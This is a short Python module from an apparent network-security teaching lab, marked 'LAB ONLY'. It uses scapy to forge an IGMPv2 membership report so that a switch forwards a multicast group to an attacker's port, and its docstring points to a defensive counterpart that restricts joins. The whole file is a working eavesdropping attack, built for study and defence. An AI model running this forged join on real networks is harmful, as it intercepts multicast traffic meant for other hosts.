# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-igmp: forge an IGMP join to eavesdrop a group. LAB ONLY.

Sends an IGMPv2 membership report so the switch starts forwarding a multicast
group to the attacker's port. Restricting joins on sensitive groups (see
snoop.py) contains it.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    pkt = s.IP(dst=args.group, ttl=1) / s.IGMP(type=0x16, gaddr=args.group)
    print(f"[*] forging IGMP join for {args.group} on {args.iface}")
    s.send(pkt, count=args.count, verbose=0)
    verdict("ALERT", f"joined multicast group {args.group}")
    return 0
